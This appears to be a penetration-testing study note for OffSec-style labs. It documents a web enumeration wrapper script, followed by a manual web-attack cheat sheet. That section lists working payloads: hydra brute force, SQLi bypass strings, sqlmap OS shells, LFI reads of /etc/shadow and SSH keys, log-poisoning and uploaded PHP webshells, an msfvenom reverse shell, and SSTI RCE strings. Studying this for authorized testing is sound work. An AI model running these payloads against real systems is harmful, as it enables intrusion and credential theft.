---
tags:
  - phase/enumeration
  - topic/web
  - tool/webenum
  - tool/ffuf
  - type/tool-docs
---
# webenum.sh — Usage Guide

Deep web enumeration wrapper that runs **after** `recon.sh`. Where recon does a quick HTTP pass (whatweb, gobuster with dirbuster-medium), webenum goes deeper: aggressive fingerprinting, larger wordlists, tech-stack-targeted extensions, recursive fuzzing, vhost discovery, and parameter fuzzing.

**Enumeration only — no exploitation. OffSec compliant.**

---

## Setup (Do This Before engagement Day)

```bash
chmod +x webenum.sh
sudo mv webenum.sh /usr/local/bin/webenum

# Verify required tools
webenum --help

# Install dependencies if missing
sudo apt install ffuf whatweb curl python3 seclists
```

**Required:** ffuf, curl, python3
**Recommended:** whatweb (fingerprinting), seclists (better wordlists)
**Graceful degradation:** Script continues if whatweb is missing. ffuf is the only hard requirement.

### Wordlist Check

The script auto-selects the best available wordlist with fallback:

| Priority | Wordlist | Lines | Source |
|----------|----------|-------|--------|
| 1st | `raft-medium-directories.txt` | ~30k | seclists |
| 2nd | `directory-list-2.3-medium.txt` | ~220k | dirbuster |
| 3rd | `common.txt` | ~4.6k | dirb (always on Kali) |

If seclists isn't installed: `sudo apt install seclists`

---

## engagement Day Workflow

### Step 1: recon.sh Finds HTTP → Run Webenum

```bash
# Fastest: auto-detect URL from recon output
webenum --from-recon 192.168.50.100

# Or specify URL directly
webenum --url http://192.168.50.100

# Non-standard port
webenum --url http://192.168.50.100:8080

# HTTPS
webenum --url https://192.168.50.100

# HTTPS non-standard port
webenum --url https://192.168.50.100:8443
```

This runs Phases 1, 2, 4 (if vhost specified), and 6 (summary).

Before scanning, the script **automatically checks HTTP connectivity** — it curls the target URL and reports the response code and size. If the target isn't responding (code `000`), you'll see an error with troubleshooting hints before any scans run. If it returns a 4xx/5xx, you'll get a warning that the URL might be wrong but scanning will proceed.

### Step 2: Read the Summary First

```bash
cat $TOOLKIT_ROOT/web/192.168.50.100_80_http/artifacts/web/summary/summary.md
cat $TOOLKIT_ROOT/web/192.168.50.100_80_http/artifacts/web/summary/quick_wins.txt
```

`summary.md` is structured: tech stack → headers → sensitive paths → directory findings → vhosts → source hints. `quick_wins.txt` gives you high-value lines grouped by category — and now includes **ready-to-run commands** for auth prompts (hydra), login forms (hydra http-post-form template), WordPress (wpscan), vhosts (re-run webenum per vhost), and parameters (sqlmap). Read it before going manual.

### Step 3: Found a Domain Name? → Vhost Fuzz

If you discover a domain name (e.g. from a redirect, certificate, or HTML source), re-run with vhost fuzzing:

```bash
# Add the domain to /etc/hosts first
echo "192.168.50.100 target.htb" | sudo tee -a /etc/hosts

# Fuzz for virtual hosts
webenum --url http://192.168.50.100 --vhost target.htb
```

If vhosts are found, the script prints `/etc/hosts` entries to add. Then run webenum again for each discovered vhost:

```bash
echo "192.168.50.100 dev.target.htb" | sudo tee -a /etc/hosts
webenum --url http://dev.target.htb
```

### Step 4: Stuck? → Go Deep

```bash
webenum --url http://192.168.50.100 --deep
```

Deep mode adds:
- **Phase 3:** Recursive fuzzing on every 200/301/302 directory found in Phase 2
- **Phase 5:** GET parameter discovery on found endpoints (root + script-like files)
- **Phase 2 extra:** Also runs `raft-large-directories.txt` (~120k entries)

### Step 5: Combine with Vhost + Deep

```bash
# The full kitchen sink — use when standard + deep haven't cracked it
webenum --url http://192.168.50.100 --deep --vhost target.htb
```

---

## Quick Reference — All Options

| Flag | Purpose | Example |
|------|---------|---------|
| `--url URL` | Target URL (required*) | `--url http://10.10.10.5:8080` |
| `--from-recon IP` | Auto-detect URL from recon output | `--from-recon 10.10.10.5` |
| `--deep` | Enable recursive fuzzing + parameter discovery | `--deep` |
| `--vhost DOMAIN` | Enable vhost fuzzing | `--vhost target.htb` |
| `--root DIR` | Custom output root (default: `$TOOLKIT_ROOT/web`) | `--root ~/pg` |
| `--threads N` | ffuf thread count (default: 40) | `--threads 20` |
| `--rate N` | Max requests/sec, 0=unlimited (default: 0) | `--rate 100` |
| `-h, --help` | Show help | |

*`--url` or `--from-recon` required.

**Bare URL also works:** `webenum http://10.10.10.5` (auto-adds `http://` if no scheme)

---

## What Each Phase Does

### Phase 1 — Fingerprinting

| Check | Output File | What to Look For |
|-------|-------------|------------------|
| whatweb aggressive (-a 3) | `fingerprint/whatweb.txt` | CMS, language, framework, OS |
| whatweb verbose | `fingerprint/whatweb_verbose.txt` | Plugin details, version strings |
| HTTP headers (follows redirects) | `fingerprint/headers.txt` | Server, X-Powered-By, cookies, auth type |
| Homepage source (first 500 lines) | `fingerprint/homepage_source.html` | Comments, hidden paths, JS files |
| Source hint extraction | `fingerprint/source_hints.txt` | HTML comments, relative paths, emails, versions |
| robots.txt | `fingerprint/robots.txt` | Disallowed paths = interesting paths |
| sitemap.xml | `fingerprint/sitemap.xml` | Endpoint discovery |
| security.txt | `fingerprint/security_txt.txt` | Contact info, scope hints |
| 27 sensitive path probes | `fingerprint/sensitive_paths.txt` | .git, .env, phpinfo, admin panels, APIs |

**Sensitive paths probed:** `.git/HEAD`, `.git/config`, `.env`, `.htaccess`, `.htpasswd`, `web.config`, `config.php`, `wp-config.php`, `phpinfo.php`, `.DS_Store`, `backup.zip`, `backup.tar.gz`, `/admin`, `/administrator`, `/login`, `/wp-admin`, `/manager`, `/phpmyadmin`, `/adminer`, `/console`, `/api`, `/api/v1`, `/swagger.json`, `/swagger-ui`, `/openapi.json`, `/_profiler`, `/debug`

### Phase 2 — Directory & File Fuzzing

**Auto-detects tech stack** from whatweb output and selects extensions:

| Detected Stack | Extensions Fuzzed |
|---------------|-------------------|
| Windows (IIS/ASP.NET) | asp, aspx, ashx, asmx, config, txt, bak |
| Java (Tomcat/Spring/Jenkins) | jsp, jspx, do, action, xml, properties, war |
| PHP (WordPress/Joomla/Drupal) | php, html, txt, bak, old, conf, xml, json, sql, log, zip |
| Generic (unknown) | php, html, txt, js, json, xml, conf, bak, old, zip, tar, gz, sql, log, env |

Runs:
- **2a:** Directory fuzzing with raft-medium (or fallback)
- **2b:** File fuzzing with tech-targeted extensions
- **2c:** (deep only) Directory fuzzing with raft-large

Output: `content/dirs_medium.json`, `content/dirs_medium.txt`, `content/files_medium.json`, `content/files_medium.txt`

**ffuf match codes:** 200, 201, 204, 301, 302, 307, 401, 403, 405
**No `-ac` (autocalibrate):** Intentionally omitted — it silently drops valid results on some targets by over-filtering. Uses explicit `-mc` instead.

### Phase 3 — Recursive Fuzzing (--deep only)

Parses Phase 2 JSON for 200/301/302 results, then fuzzes inside each discovered directory with the same wordlist + extensions. Capped at 20 directories.

Output: `content/recursive/<dir_name>.json` + `.txt`

### Phase 4 — VHost Fuzzing (--vhost only)

Gets a baseline response size from a nonexistent host (`nonexistent12345.domain`), then fuzzes `Host: FUZZ.domain` headers, filtering out responses matching the baseline size.

Output: `vhosts/vhosts.json`, `vhosts/vhosts.txt`, `vhosts/hosts_entries.txt`

### Phase 5 — Parameter Discovery (--deep only)

Fuzzes `?FUZZ=testvalue` on discovered endpoints (root + 200-status script files like `.php`, `.asp`, `.jsp`). Filters by baseline response size. Uses burp-parameter-names.txt wordlist. Capped at 15 endpoints.

Output: `params/params_<endpoint>.json` + `.txt`

### Phase 6 — Summary Generation

Aggregates everything into `summary/summary.md` (structured report) and `summary/quick_wins.txt` (high-value lines only, grouped by category).

`quick_wins.txt` now includes:
- **robots.txt Disallow entries** — per-path `curl -w '%{http_code}'` probe commands (auto-generated, no placeholders)
- **Sensitive files found** — resolved `curl -sk <url><path> -o /tmp/loot_<file>` commands for each actual 200-status sensitive file found
- **CMS detection** — Joomla (`joomscan`), Drupal (`droopescan` + Drupalgeddon), Tomcat (WAR upload recipe with `LHOST` auto-resolved from tun0/eth0), Jenkins (Groovy console RCE with resolved IP + `penelope -p 4444 -O` reminder), phpMyAdmin (SQLi shell write) — specific attack commands per CMS

---

## Output Structure

```
$TOOLKIT_ROOT/web/<host>_<port>_<proto>/artifacts/web/
├── fingerprint/
│   ├── whatweb.txt              # Tech stack identification
│   ├── whatweb_verbose.txt      # Detailed plugin output
│   ├── headers.txt              # Full HTTP response headers
│   ├── homepage_source.html     # First 500 lines of homepage
│   ├── source_hints.txt         # Comments, paths, emails, versions
│   ├── robots.txt               # Disallowed paths
│   ├── sitemap.xml              # Endpoint map
│   ├── security_txt.txt         # Security contact info
│   └── sensitive_paths.txt      # ★ Probe results for 27 common paths
├── content/
│   ├── dirs_medium.json         # ffuf raw JSON (for tooling)
│   ├── dirs_medium.txt          # ★ Human-readable directory findings
│   ├── files_medium.json
│   ├── files_medium.txt         # ★ Human-readable file findings
│   ├── dirs_large.json/txt      # (deep mode only)
│   └── recursive/               # (deep mode only)
│       └── <dirname>.json/txt
├── vhosts/                      # (--vhost only)
│   ├── vhosts.json/txt
│   └── hosts_entries.txt        # ★ Copy-paste into /etc/hosts
├── params/                      # (deep mode only)
│   └── params_<endpoint>.json/txt
├── summary/
│   ├── summary.md               # ★ READ THIS FIRST
│   └── quick_wins.txt           # ★ High-value lines, grouped
└── progress.log                 # Phase completion tracking
```

**Files marked ★ are your primary engagement-day reads.**

> [!warning] After webenum completes — do NOT:
> - Re-run gobuster or ffuf manually with the same wordlist — webenum already did this
> - Re-run whatweb or curl headers — already in `fingerprint/`
> - Re-probe sensitive paths — already in `sensitive_paths.txt`
>
> **Only go manual when:**
> - Results suggest a specific exploit path (login page → SQLi, param → LFI)
> - You need authenticated fuzzing (webenum has no creds)
> - You need to filter soft 404s with `-fs` that webenum couldn't auto-detect
> - `--deep` mode hasn't been tried yet

---

## engagement Decision Tree

```
recon.sh found HTTP?
│
├── Run: webenum --url http://TARGET
│   └── Read summary/summary.md + quick_wins.txt
│
├── Found domain name? (redirect, cert, source)
│   ├── Add to /etc/hosts
│   └── Run: webenum --url http://TARGET --vhost domain.htb
│       └── Found vhosts? Add each to /etc/hosts, run webenum per vhost
│
├── Nothing obvious from standard run?
│   └── Run: webenum --url http://TARGET --deep
│       ├── Check recursive findings for hidden paths
│       └── Check param findings for injectable parameters
│
├── Target seems slow / rate-limited?
│   └── Run: webenum --url http://TARGET --threads 10 --rate 50
│
└── Multiple HTTP ports on same target?
    └── Run webenum separately for each:
        webenum --url http://TARGET:80
        webenum --url http://TARGET:8080
        webenum --url https://TARGET:443
```

---

## Interpreting Results

### sensitive_paths.txt — What Each Code Means

| Code | Meaning | Action |
|------|---------|--------|
| `[200]` | Page exists and accessible | Open in browser, investigate immediately |
| `[301/302]` | Redirect | Follow with `curl -L`, check destination |
| `[401]` | Auth required | Try default creds, check for bypass |
| `[403]` | Forbidden | Try different extensions, case variations, path traversal |

### High-Value Sensitive Path Hits

| Path | Why It Matters |
|------|---------------|
| `/.git/HEAD` | Full source code download via git-dumper |
| `/.env` | Cleartext credentials, API keys, DB connection strings |
| `/phpinfo.php` | Full PHP config, file paths, loaded modules |
| `/wp-config.php` | WordPress DB credentials |
| `/backup.zip` | Source code leak |
| `/swagger.json` | Full API endpoint map |
| `/console` | Python Werkzeug debugger (RCE if PIN bypass) |
| `/adminer` | Database admin panel |

### ffuf Output Columns

```
URL                                    | Status |     Size |  Words | Lines
http://10.10.10.5/admin               |    200 |     1234 |     56 |    12
```

- **Size/Words/Lines:** Use to distinguish real pages from custom 404s. If many results have the same size, they're likely false positives — re-run with `-fs <size>` to filter.

---

## Common engagement Patterns

> [!tip] Check quick_wins.txt first
> For WordPress, login forms, 401 pages, and parameters — `quick_wins.txt` now has the ready-to-run command already built. Check it before going manual.

### WordPress Detected
```bash
# quick_wins.txt contains this command — copy it from there (URL is pre-filled)
wpscan --url http://TARGET --enumerate ap,at,u --plugins-detection aggressive
```

### Login Page Found
```bash
# quick_wins.txt contains a hydra http-post-form template for detected login forms
# Adjust the form body and failure string, then run:
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      http-post-form "TARGET:/login:user=^USER^&pass=^PASS^:Invalid"
```

### Auth-Required Pages (401)
```bash
# quick_wins.txt contains a hydra http-get command for each 401 path — copy from there
hydra -L users.txt -P passwords.txt TARGET http-get /admin
```

### Parameter Found (--deep mode)
```bash
# quick_wins.txt contains a sqlmap command for parameters found by Phase 5 — copy from there
sqlmap -u "http://TARGET/page?id=1" --batch --level 3 --risk 2
```

### robots.txt Disallow Entries Found
```bash
# quick_wins.txt now auto-generates per-path curl probes — e.g.:
curl -sk -o /dev/null -w '%{http_code} http://TARGET/admin-panel\n' 'http://TARGET/admin-panel'
# Copy these from quick_wins.txt — no manual retyping needed
```

### Non-WordPress CMS Detected

`quick_wins.txt` prints specific attack commands automatically:

| CMS | Commands Generated |
|-----|--------------------|
| Joomla | `joomscan --url`, admin login panel URL, hydra http-post-form template |
| Drupal | `droopescan scan drupal -u`, version check via `CHANGELOG.txt`, Drupalgeddon msfconsole one-liner |
| Tomcat | Manager panel URL, default creds check, WAR shell deploy + trigger sequence — `LHOST` auto-resolved, `penelope -p 4444 -O` reminder printed |
| Jenkins | Script console URL, Groovy reverse shell — IP auto-resolved, `penelope -p 4444 -O` reminder printed |
| phpMyAdmin | Login URL, default creds, SQLi `SELECT INTO OUTFILE` shell write |

### Sensitive Files Found (Resolved Paths)
```bash
# quick_wins.txt now uses actual found paths instead of <SENSITIVE_PATH> placeholder:
curl -sk http://TARGET/backup.zip -o /tmp/loot_backup.zip && grep -iE 'pass|secret|key|user|db_' /tmp/loot_backup.zip
curl -sk http://TARGET/.env -o /tmp/loot_.env && grep -iE 'pass|secret|key|user|db_' /tmp/loot_.env
# Commands are specific to what was actually found — copy from quick_wins.txt
```

### API Endpoint Found (/api, /swagger.json)
```bash
# Manually explore the API:
curl -s http://TARGET/api/ | python3 -m json.tool
curl -s http://TARGET/swagger.json | python3 -m json.tool
# Look for unauthenticated endpoints, IDOR, parameter manipulation
```

### .git Exposed
```bash
# Dump the entire repository:
git-dumper http://TARGET/.git/ ./git-dump
cd git-dump && git log --oneline
git diff HEAD~5  # check recent changes for creds
```

---

## Resume & Re-run Behavior

The script tracks completed phases in `progress.log`. Re-running safely skips finished work:

```bash
# First run — completes phases 1, 2, 6
webenum --url http://TARGET

# Later — add vhost fuzzing (phases 1, 2 skipped, phase 4 runs, 6 regenerates)
webenum --url http://TARGET --vhost target.htb

# Later — go deep (phases 1, 2 skipped, phases 3, 5 run, 6 regenerates)
webenum --url http://TARGET --deep
```

To force a full re-run, delete the output directory:

```bash
rm -rf $TOOLKIT_ROOT/web/192.168.50.100/
webenum --url http://192.168.50.100
```

---

## Troubleshooting

**ffuf returns thousands of results (false positives):**
The target is returning the same response for everything. Find the common response size from the output, then manually re-run ffuf with a size filter:
```bash
ffuf -u http://TARGET/FUZZ -w /path/to/wordlist -mc 200,301,302 -fs 1234 -t 40
```

**Scan is too slow over VPN:**
Lower threads and add rate limit:
```bash
webenum --url http://TARGET --threads 10 --rate 50
```

**SecLists not installed:**
```bash
sudo apt install seclists
```
The script falls back to `/usr/share/wordlists/dirb/common.txt` (always on Kali) but coverage is much lower.

**VHost fuzzing finds nothing:**
The baseline filtering may be too aggressive. Check `vhosts/vhosts.json` manually, or re-run ffuf with different filters:
```bash
ffuf -u http://TARGET -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -t 40
```

**Phase skipped (already done):**
Delete `progress.log` or the specific output directory:
```bash
rm $TOOLKIT_ROOT/web/TARGET_PORT_PROTO/artifacts/web/progress.log
```

---

## Configuration (Edit in Script)

| Variable | Default | Purpose |
|----------|---------|---------|
| `OUTPUT_ROOT` | `$TOOLKIT_ROOT/web` | Base output directory |
| `THREADS` | `40` | ffuf thread count |
| `FFUF_TIMEOUT` | `30` | Per-request timeout (seconds) |
| `FFUF_RATE` | `0` | Requests/sec limit (0 = unlimited) |
| `PHASE_CONTENT_TIMEOUT` | `900` (15 min) | Max time per ffuf wordlist run |
| `PHASE_RECURSIVE_TIMEOUT` | `600` (10 min) | Max time per recursive directory |
| `PHASE_VHOST_TIMEOUT` | `600` (10 min) | Max time for vhost fuzzing |
| `PHASE_FINGERPRINT_TIMEOUT` | `120` (2 min) | Max time for sensitive path probes |

---

---

## What the Script Won't Find — Manual Web Testing

> [!important] webenum.sh finds the surface. These are the attacks the tool cannot automate — you need to do these manually when the automated run returns no foothold vector.

---

### When Directory Busting Finds Nothing

The wordlist didn't match the naming convention. Try different wordlists:

```bash
# Technology-specific wordlists
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,txt
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt        # IIS
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt      # Apache
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt      # Spring

# Case-sensitive variations (IIS is case-insensitive, Linux is not)
# If Linux target: try lowercase, uppercase, capitalized
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Common backup/config file patterns
for ext in bak old backup swp ~ .orig; do
  curl -sk "http://IP/index.php${ext}" -o /dev/null -w "index.php${ext}: %{http_code}\n"
done

# Parameter fuzzing on pages that return 200
ffuf -u "http://IP/index.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fc 404 -t 20 -v
```

---

### Login Pages — When Default Creds Don't Work

The script doesn't brute-force web login forms. If you have a login page:

```bash
# Identify the form fields first (use curl or browser DevTools)
curl -sk http://IP/login -v 2>&1 | grep -iE 'input|form|action'

# Hydra HTTP POST form brute force
# Syntax: "POST_PATH:POST_BODY:FAIL_STRING"
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# Common default credentials to try manually first (faster than brute force)
# admin:admin, admin:password, admin:admin123, admin:(blank)
# administrator:administrator, root:root, user:user
# App-specific: tomcat:tomcat, manager:manager, pi:raspberry
# Check the app version → searchsploit for default creds

# SQLi in login field — try these manually before running sqlmap
admin'--
admin'#
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin' OR '1'='1'--
```

---

### SQL Injection — When You Find a Form or Parameter

```bash
# Quick test — if the page errors or behaves differently, it's injectable
curl -sk "http://IP/page.php?id=1'"          # single quote error
curl -sk "http://IP/page.php?id=1 AND 1=1"  # should return same as ?id=1
curl -sk "http://IP/page.php?id=1 AND 1=2"  # should return different/empty

# Automated scan (run in background — can take time)
sqlmap -u "http://IP/page.php?id=1" --batch --dbs --level 3 --risk 2

# If POST form
sqlmap -u "http://IP/login" --data "username=admin&password=pass" --batch --dbs

# SQLi to RCE (if MySQL with FILE privilege or MSSQL with xp_cmdshell)
# MySQL
sqlmap -u "http://IP/page.php?id=1" --batch --os-shell
# MSSQL
sqlmap -u "http://IP/page.php?id=1" --batch --os-shell --dbms mssql
```

---

### Local File Inclusion (LFI)

If the URL has a `page=`, `file=`, `path=`, `include=`, `lang=`, or similar parameter:

```bash
# Basic test
curl -sk "http://IP/page.php?file=../../../../etc/passwd"
curl -sk "http://IP/page.php?file=....//....//....//etc/passwd"   # filter bypass
curl -sk "http://IP/page.php?file=/etc/passwd%00"                 # null byte (old PHP)

# Windows targets
curl -sk "http://IP/page.aspx?file=../../../../windows/win.ini"
curl -sk "http://IP/page.aspx?file=C:\windows\win.ini"

# LFI to RCE via log poisoning (Apache)
# 1. Poison the access log with PHP code in User-Agent
curl -sk http://IP/ -A "<?php system(\$_GET['cmd']); ?>"
# 2. Include the log and execute
curl -sk "http://IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id"

# LFI to RCE via PHP wrappers
curl -sk "http://IP/page.php?file=php://filter/convert.base64-encode/resource=index.php"
# Decode the output: echo 'BASE64STRING' | base64 -d > source.php
curl -sk "http://IP/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"

# Useful LFI targets (Linux)
/etc/passwd
/etc/shadow
/home/user/.ssh/id_rsa
/var/log/apache2/access.log
/var/log/auth.log
/proc/self/environ
/proc/net/fib_trie                              # internal IP ranges

# Useful LFI targets (Windows)
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Windows\System32\drivers\etc\hosts
```

---

### File Upload — When You Find an Upload Form

```bash
# Test what's accepted — try in this order:
# 1. Direct .php upload
# 2. .php5, .phtml, .phar, .php3 (bypasses extension blacklists)
# 3. Rename: shell.php.jpg (double extension)
# 4. Case variation: shell.PhP, shell.PHP
# 5. Content-Type bypass: change Content-Type to image/jpeg while keeping .php extension
# 6. Magic bytes: prepend GIF89a; to the PHP payload

# Basic PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# If the app checks MIME type, forge it with curl:
curl -sk -X POST http://IP/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -F "submit=Upload"

# After upload, find the file path from the response or by guessing:
curl -sk "http://IP/uploads/shell.php?cmd=id"
curl -sk "http://IP/files/shell.php?cmd=id"

# ASPX webshell for Windows/IIS
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f aspx > shell.aspx
# Then upload shell.aspx and visit it while Penelope is listening
```

---

### Server-Side Template Injection (SSTI)

If the app reflects your input back (name fields, search boxes, custom messages):

```bash
# Probe — inject template expressions and see if they evaluate
# In the vulnerable field, try each:
{{7*7}}          # if you see 49, it's Jinja2/Twig
${7*7}           # FreeMarker, Velocity
<%= 7*7 %>       # ERB (Ruby)
#{7*7}           # Thymeleaf

# Jinja2 RCE (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig RCE (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

### HTTP Verb Tampering and Method Abuse

```bash
# Check what verbs the server accepts
curl -sk -X OPTIONS http://IP/ -v 2>&1 | grep -i allow

# TRACE — if enabled, reflects request headers (useful for XST, shows auth headers)
curl -sk -X TRACE http://IP/ -v

# PUT — if allowed, try writing files (WebDAV)
curl -sk -X PUT http://IP/shell.php -d "<?php system(\$_GET['cmd']); ?>"
davtest -url http://IP       # tests all verbs + file upload capabilities

# Method override — some apps check X-HTTP-Method-Override
curl -sk -X POST http://IP/admin -H "X-HTTP-Method-Override: DELETE"

# HEAD instead of GET — sometimes bypasses auth checks
curl -sk -I http://IP/admin/config.php
```

---

### Authentication Bypass

When you find a login form that tools can't crack:

```bash
# Try direct access to admin pages (no login required?)
curl -sk http://IP/admin/
curl -sk http://IP/dashboard/
curl -sk http://IP/manage/

# Path traversal to bypass auth middleware
curl -sk http://IP/..;/admin/
curl -sk http://IP/%2e%2e/admin/

# Cookie manipulation — if you see a role=user or admin=false cookie
# Change it in Burp or via curl:
curl -sk http://IP/admin -H "Cookie: role=admin; session=your_session_token"

# JWT tampering — if you see a JWT token (three base64 parts separated by dots)
# Decode: echo "PAYLOAD_PART" | base64 -d
# Try: change "role":"user" to "role":"admin", then re-sign with empty secret
# Tool: jwt_tool eyJhbGciOiJIUzI1NiJ9... -T      # interactive tamper

# IDOR — change numeric IDs in URLs
curl -sk http://IP/api/user/1        # your profile
curl -sk http://IP/api/user/2        # someone else's
curl -sk http://IP/api/user/0
curl -sk http://IP/api/user/100
```

---

### API Enumeration

When the site seems like an API or has JavaScript that makes XHR calls:

```bash
# Check JavaScript source for API endpoints
curl -sk http://IP/ | grep -oP '(api|v[0-9]|rest|graphql)[^\s"\'<>]*' | sort -u

# Common API paths
for path in /api /api/v1 /api/v2 /rest /graphql /swagger /swagger.json /openapi.json; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://IP${path}")
  echo "$path: $code"
done

# Swagger/OpenAPI gives you all endpoints
curl -sk http://IP/swagger.json | python3 -m json.tool | grep '"path"'
curl -sk http://IP/api/swagger.json
curl -sk http://IP/v2/swagger.json

# GraphQL introspection
curl -sk -X POST http://IP/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# ffuf against API paths specifically
ffuf -u http://IP/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,401,403 -v
```

---

### Source Code and Sensitive File Discovery

```bash
# Git repo exposed
curl -sk http://IP/.git/HEAD         # if "ref: refs/heads/master" → git is exposed
git-dumper http://IP/.git/ ./git_dump
cd git_dump && git log --oneline     # check commit history
git show HEAD                        # view latest commit
git log --all --oneline | head -20   # all branches/commits

# Common sensitive files
for f in .env .env.backup .env.local config.php wp-config.php \
          database.yml settings.py secrets.py .htpasswd phpinfo.php \
          info.php server-status server-info crossdomain.xml \
          sitemap.xml .DS_Store package.json composer.json; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "http://IP/${f}")
  [[ "$code" != "404" ]] && echo "$f: $code"
done

# Source code disclosure via path tricks
curl -sk http://IP/index.php.bak
curl -sk "http://IP/index.php%20"    # trailing space (IIS)
curl -sk "http://IP/index.php."      # trailing dot (IIS)
```

---

## Related

- [[scripts/recon]] — run this first to find HTTP services
- [[Web_App]] — web attack vectors after enumeration
- [[SQL_Injection]] — if webenum finds login/search forms
- [[Burp_Suite]] — manual testing after webenum finds endpoints
- [[OffSec_Exam_Methodology_Complete]] — where web enum fits in the attack chain
- [[Reverse_Shells]] — use Penelope with -O flag after exploitation
